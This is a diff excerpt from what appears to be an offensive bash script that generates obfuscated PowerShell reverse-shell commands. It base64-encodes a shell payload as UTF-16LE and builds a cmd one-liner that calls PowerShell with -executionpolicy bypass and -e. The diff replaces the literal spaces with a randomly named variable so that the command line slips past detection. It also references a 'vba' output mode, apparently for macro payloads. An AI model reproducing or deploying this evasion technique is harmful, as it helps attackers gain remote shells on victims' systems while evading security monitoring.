@@ -613,7 +613,7 @@ result=$(openssl rand -hex $(shuf -i 1-11 -n1))
 wevutil=$(shuf -er -n20  {A..Z} {a..z} | tr -d '\n')
 pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
 placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
-
+space=$(shuf -er -n3  {A..Z} {a..z} | tr -d '\n')
 
 
 
@@ -693,8 +693,8 @@ else
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-#rev="set ${pwsh}=powershell && ${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
-rev="set ${pwsh}=${pw_sh} && call %^${pwsh}% ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+#rev="set ${pwsh}=${pw_sh} && set ${space}=" " && ${pwsh} && call %${pwsh}%%%${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
+rev="set ${pwsh}=${pw_sh} && set ${space}=\" \" && call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}"
 
 
 if [[ $5 == "vba" ]] 
